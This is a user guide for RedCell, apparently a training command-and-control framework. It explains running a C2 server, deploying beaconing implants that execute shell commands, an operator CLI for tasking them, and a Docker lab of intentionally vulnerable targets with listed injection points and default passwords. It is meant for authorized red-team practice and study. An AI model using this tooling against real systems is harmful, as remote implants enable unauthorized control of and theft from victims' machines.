# RedCell User Guide

**Complete guide to using the RedCell C2 framework for authorized security testing**

---

## Table of Contents

1. [Prerequisites](#prerequisites)
2. [Installation](#installation)
3. [Architecture Overview](#architecture-overview)
4. [Getting Started](#getting-started)
5. [C2 Server Operations](#c2-server-operations)
6. [Deploying Implants](#deploying-implants)
7. [Operator Interface](#operator-interface)
8. [Target Environment](#target-environment)
9. [Testing](#testing)
10. [Troubleshooting](#troubleshooting)
11. [Best Practices](#best-practices)
12. [Advanced Configuration](#advanced-configuration)

---

## Prerequisites

### Required Software

- **Python 3.9 or higher**
  - Check: `python --version`
  - Download: https://www.python.org/downloads/

- **Docker Desktop** (for target environments)
  - Check: `docker --version` and `docker-compose --version`
  - Download: https://www.docker.com/products/docker-desktop/

- **Git**
  - Check: `git --version`
  - Download: https://git-scm.com/downloads/

### System Requirements

- **OS:** Windows 10/11, macOS, or Linux
- **RAM:** 4GB minimum (8GB recommended for Docker)
- **Disk:** 2GB free space
- **Network:** Localhost access (127.0.0.1)

---

## Installation

### Step 1: Clone the Repository

```bash
git clone https://github.com/PeteSumners/redcell.git
cd redcell
```

### Step 2: Create Virtual Environment

**On Windows:**
```bash
python -m venv venv
venv\Scripts\activate
```

**On macOS/Linux:**
```bash
python3 -m venv venv
source venv/bin/activate
```

You should see `(venv)` in your terminal prompt.

### Step 3: Install Dependencies

```bash
pip install -r requirements_minimal.txt
```

This installs:
- Flask (C2 web server)
- cryptography (AES encryption)
- pytest (testing framework)
- rich (CLI interface)
- Other core dependencies

### Step 4: Verify Installation

Run the test suite to ensure everything is working:

```bash
python -m pytest tests/ -v
```

You should see: `39 passed` ✅

---

## Architecture Overview

RedCell consists of four main components:

```
┌─────────────────────────────────────────────────────────┐
│                    OPERATOR                             │
│                                                         │
│  ┌──────────────┐         ┌──────────────────┐        │
│  │ Operator CLI │────────▶│   C2 Server      │        │
│  │ (cli.py)     │  HTTP   │   (main.py)      │        │
│  └──────────────┘         └─────────┬────────┘        │
│                                     │                  │
└─────────────────────────────────────┼──────────────────┘
                                      │
                          Encrypted C2 Channel
                          (AES-256-GCM)
                                      │
                        ┌─────────────▼──────────────┐
                        │      IMPLANT               │
                        │   (basic_implant.py)       │
                        │                            │
                        │  Running on target system  │
                        └────────────────────────────┘
```

### Components

1. **C2 Server** (`c2/server/main.py`)
   - Central command server
   - Manages all implants
   - Handles task queuing
   - Runs on port 8443 by default

2. **Operator CLI** (`c2/operator/cli.py`)
   - Interactive terminal interface
   - Send commands to implants
   - View implant status and results
   - Color-coded output

3. **Implant** (`c2/implant/basic_implant.py`)
   - Runs on compromised target
   - Beacons to C2 server
   - Executes tasks
   - Returns results

4. **Target Environment** (`targets/docker/`)
   - Vulnerable web applications
   - Practice exploitation
   - Isolated Docker networks

---

## Getting Started

### Quick Start (3 Terminals)

You'll need **three terminal windows** for a complete setup:

#### Terminal 1: C2 Server

```bash
# Activate virtual environment
venv\Scripts\activate  # Windows
# OR
source venv/bin/activate  # macOS/Linux

# Start C2 server
python c2/server/main.py --host 127.0.0.1 --port 8443
```

You should see:
```
C2 Server starting on 127.0.0.1:8443
Master encryption key: [base64 key]
 * Running on http://127.0.0.1:8443
```

**Keep this terminal running!**

#### Terminal 2: Implant (Simulated Target)

```bash
# Activate virtual environment
venv\Scripts\activate  # Windows
# OR
source venv/bin/activate  # macOS/Linux

# Deploy implant
python c2/implant/basic_implant.py --c2 http://127.0.0.1:8443
```

You should see:
```
Implant starting, C2: http://127.0.0.1:8443
Attempting registration (attempt 1/5)
Successfully registered as [implant-id]
Sleeping for XX.XX seconds
```

**Keep this terminal running!**

#### Terminal 3: Operator Interface

```bash
# Activate virtual environment
venv\Scripts\activate  # Windows
# OR
source venv/bin/activate  # macOS/Linux

# Start operator CLI
python c2/operator/cli.py --c2 http://127.0.0.1:8443
```

You should see:
```
RedCell Operator CLI
Connected to: http://127.0.0.1:8443
Type 'help' for commands

redcell >
```

**Now you're ready to operate!**

---

## C2 Server Operations

### Starting the Server

**Basic:**
```bash
python c2/server/main.py
```

**With Options:**
```bash
python c2/server/main.py --host 0.0.0.0 --port 443 --debug
```

**Options:**
- `--host` - IP to bind to (default: 127.0.0.1)
- `--port` - Port to listen on (default: 8443)
- `--debug` - Enable debug logging
- `--config` - Path to config file

### Server Endpoints

The C2 server exposes these REST API endpoints:

| Endpoint | Method | Purpose |
|----------|--------|---------|
| `/health` | GET | Health check |
| `/api/register` | POST | Implant registration |
| `/api/beacon/<id>` | POST | Implant check-in |
| `/api/task` | POST | Create task |
| `/api/implants` | GET | List all implants |
| `/api/implants/active` | GET | List active implants |
| `/api/implant/<id>` | GET | Get implant details |
| `/api/task/<id>` | GET | Get task details |

### Logs

Server logs are written to:
```
c2/server/logs/c2_server.log
```

---

## Deploying Implants

### Basic Deployment

```bash
python c2/implant/basic_implant.py --c2 http://127.0.0.1:8443
```

### Deployment Options

```bash
python c2/implant/basic_implant.py --c2 http://C2-IP:PORT [--verify-ssl]
```

**Options:**
- `--c2` - C2 server URL (required)
- `--verify-ssl` - Verify SSL certificates (default: False for self-signed)

### What Happens When Implant Starts

1. **System Enumeration**
   - Gathers hostname, username, IP, OS info

2. **Registration**
   - Sends system info to C2
   - Receives unique implant ID
   - Gets encryption key
   - Configures beacon interval

3. **Beacon Loop**
   - Sleeps for interval (60s default) with jitter (±20%)
   - Sends encrypted beacon to C2
   - Receives pending tasks
   - Executes tasks
   - Returns results on next beacon

### Implant Commands

The implant supports these built-in commands:

| Command | Arguments | Description |
|---------|-----------|-------------|
| `shell` | `cmd` | Execute shell command |
| `sysinfo` | - | Return system information |
| `pwd` | - | Get current directory |
| `ls` | `path` (optional) | List directory contents |
| `sleep` | `interval` | Change beacon interval |
| `exit` | - | Terminate implant |

---

## Operator Interface

### Starting the Operator CLI

```bash
python c2/operator/cli.py --c2 http://127.0.0.1:8443
```

### Available Commands

#### Implant Management

**List all implants:**
```
redcell > list
```

**List only active implants:**
```
redcell > list --active
```

**Show implant details:**
```
redcell > show <implant-id>
```

**Select an implant:**
```
redcell > use <implant-id>
```

#### Tasking Commands

**Execute shell command:**
```
redcell (12345678...) > task shell whoami
redcell (12345678...) > task shell "ls -la /tmp"
```

**Get system information:**
```
redcell (12345678...) > task sysinfo
```

**Get current directory:**
```
redcell (12345678...) > task pwd
```

**List directory:**
```
redcell (12345678...) > task ls
redcell (12345678...) > task ls /etc
```

**Change beacon interval:**
```
redcell (12345678...) > task sleep 30
```

**Exit implant:**
```
redcell (12345678...) > task exit
```

**View task results:**
```
redcell > showtask <task-id>
```

#### General Commands

**Show help:**
```
redcell > help
```

**Exit operator CLI:**
```
redcell > exit
```

### Example Session

```bash
redcell > list
# Shows table of implants

redcell > use a1b2c3d4-e5f6-7890-abcd-ef1234567890
Now using implant: a1b2c3d4-e5f6-7890-abcd-ef1234567890

redcell (a1b2c3d4...) > task sysinfo
Task created: task-xyz123

redcell (a1b2c3d4...) > task shell whoami
Task created: task-abc456

# Wait for implant to beacon (up to 60 seconds)

redcell (a1b2c3d4...) > showtask task-xyz123
# Shows system information result

redcell (a1b2c3d4...) > showtask task-abc456
# Shows whoami output
```

---

## Target Environment

### Starting Target Infrastructure

```bash
docker-compose up -d
```

This starts:
- **Web Application** (port 8080) - Vulnerable web app
- **DMZ Host** - SSH-accessible pivot point
- **Internal Server** - High-value target
- **Database** - MySQL for web app

### Accessing Targets

**Web Application:**
```
http://localhost:8080
```

**Vulnerabilities:**
- SQL Injection at `/login`
- Command Injection at `/ping`
- File Upload at `/upload`
- SSTI at `/search`

**DMZ Host SSH:**
```bash
ssh dmzuser@localhost -p 2222
Password: password123
```

**Internal Server SSH:**
```bash
# Must pivot through DMZ host first
ssh internaluser@172.21.0.x
Password: internal123
```

### Stopping Targets

```bash
docker-compose down
```

### Viewing Logs

```bash
docker-compose logs -f
```

---

## Testing

### Running All Tests

```bash
python -m pytest tests/ -v
```

Expected output: `39 passed`

### Running Specific Test Suites

**Crypto tests only:**
```bash
python -m pytest tests/unit/test_crypto.py -v
```

**Tasking tests only:**
```bash
python -m pytest tests/unit/test_tasking.py -v
```

**Integration tests only:**
```bash
python -m pytest tests/integration/ -v
```

### Running with Coverage

```bash
python -m pytest tests/ -v --cov
```

### Test Categories

- **Unit Tests** - Individual component testing
- **Integration Tests** - End-to-end workflow testing
- **Slow Tests** - Long-running tests (marked with `@pytest.mark.slow`)

---

## Troubleshooting

### Common Issues

#### Issue: "No module named pytest"

**Solution:**
```bash
# Make sure virtual environment is activated
venv\Scripts\activate  # Windows
source venv/bin/activate  # Linux/Mac

# Reinstall dependencies
pip install -r requirements_minimal.txt
```

#### Issue: "Connection refused" when starting implant

**Solution:**
1. Check C2 server is running
2. Verify the C2 URL is correct
3. Check firewall isn't blocking port 8443

```bash
# Test C2 server is up
curl http://127.0.0.1:8443/health
```

#### Issue: Implant not receiving tasks

**Solution:**
1. Wait for beacon interval (up to 60 seconds)
2. Check implant is registered: `list` command in operator CLI
3. Ensure you've selected the implant: `use <implant-id>`
4. Verify task was created successfully

#### Issue: Docker containers won't start

**Solution:**
```bash
# Check Docker is running
docker ps

# View logs for errors
docker-compose logs

# Try rebuilding
docker-compose down
docker-compose up --build -d
```

#### Issue: Permission denied when running Python scripts

**Solution:**
```bash
# Make sure you're in the project directory
cd redcell

# Use python instead of ./script.py
python c2/server/main.py
```

### Debug Mode

Enable debug logging for more information:

**C2 Server:**
```bash
python c2/server/main.py --debug
```

**Check Logs:**
```bash
tail -f c2/server/logs/c2_server.log
```

---

## Best Practices

### Operational Security (OPSEC)

1. **Always use encryption** - All C2 communications are encrypted by default
2. **Beacon jitter** - Randomized beacon intervals prevent pattern detection
3. **Isolated environments** - Only run in lab/authorized test environments
4. **No production use** - NEVER use on systems you don't own

### Testing Best Practices

1. **Run tests before deployment**
   ```bash
   python -m pytest tests/ -v
   ```

2. **Test in isolated environment**
   - Use Docker containers
   - Separate network segments
   - No internet access for targets

3. **Document all operations**
   - C2 server logs automatically
   - Take notes of commands run
   - Screenshot results for reports

### Development Best Practices

1. **Virtual environment** - Always use `venv`
2. **Version control** - Commit changes regularly
3. **Code review** - Review code before running on targets
4. **Testing** - Write tests for new features

---

## Advanced Configuration

### Custom Configuration File

Create `config.yaml`:

```yaml
c2:
  host: 127.0.0.1
  port: 8443
  beacon_interval: 60
  beacon_jitter: 0.2
  max_retries: 3

target:
  web_app_url: http://localhost:8080
  dmz_network: 172.20.0.0/24
  internal_network: 172.21.0.0/24

log_level: INFO
operation_name: my_operation
opsec_mode: true
```

**Use configuration:**
```bash
python c2/server/main.py --config config.yaml
```

### Environment Variables

Override settings with environment variables:

```bash
# Set C2 host
export C2_HOST=0.0.0.0

# Set C2 port
export C2_PORT=443

# Set encryption key
export C2_ENCRYPTION_KEY=your_base64_key_here

# Run server
python c2/server/main.py
```

### Custom Beacon Interval

**At implant startup:**
- Default is 60 seconds with ±20% jitter

**Change dynamically:**
```bash
redcell (implant...) > task sleep 30
```

This changes beacon to 30 seconds.

### Network Configuration

**Bind to all interfaces:**
```bash
python c2/server/main.py --host 0.0.0.0
```

**Use different port:**
```bash
python c2/server/main.py --port 443
```

**Note:** Ports below 1024 require admin/root privileges.

---

## Security Considerations

### Encryption Details

- **Algorithm:** AES-256-GCM (Galois/Counter Mode)
- **Key Size:** 256 bits (32 bytes)
- **Nonce:** 96 bits, randomly generated per message
- **Authentication:** Built-in with GCM mode
- **Transport:** Base64 encoding for JSON compatibility

### Key Management

- **Per-implant keys** - Each implant gets unique encryption key
- **Key derivation** - PBKDF2 with 480,000 iterations available
- **Key storage** - Keys stored in memory only (not on disk)

### Network Security

- **Localhost only** - Default binding to 127.0.0.1
- **No SSL by default** - Use reverse proxy (nginx) for SSL in production
- **Firewalled** - Only allow necessary ports

---

## Additional Resources

### Documentation

- [ROADMAP.md](ROADMAP.md) - Full project roadmap (6 phases)
- [PHASE1_COMPLETE.md](PHASE1_COMPLETE.md) - Phase 1 summary
- [docs/writeups/phase1_foundation.md](docs/writeups/phase1_foundation.md) - Technical writeup
- [LICENSE](LICENSE) - License terms

### External Resources

- **MITRE ATT&CK Framework:** https://attack.mitre.org/
- **OWASP Top 10:** https://owasp.org/www-project-top-ten/
- **Flask Documentation:** https://flask.palletsprojects.com/
- **Python Cryptography:** https://cryptography.io/

### Support

- **Issues:** https://github.com/PeteSumners/redcell/issues
- **Email:** petesumners@outlook.com

---

## Quick Reference Card

### Essential Commands

```bash
# Start C2 Server
python c2/server/main.py

# Deploy Implant
python c2/implant/basic_implant.py --c2 http://127.0.0.1:8443

# Start Operator CLI
python c2/operator/cli.py

# Run Tests
python -m pytest tests/ -v

# Start Targets
docker-compose up -d
```

### Operator CLI Quick Commands

```bash
list                    # List all implants
list --active          # List active implants
use <id>              # Select implant
task shell <cmd>      # Run shell command
task sysinfo          # Get system info
showtask <task-id>    # View task result
help                  # Show help
exit                  # Exit CLI
```

---

**End of User Guide**

For questions, issues, or contributions, please visit:
https://github.com/PeteSumners/redcell
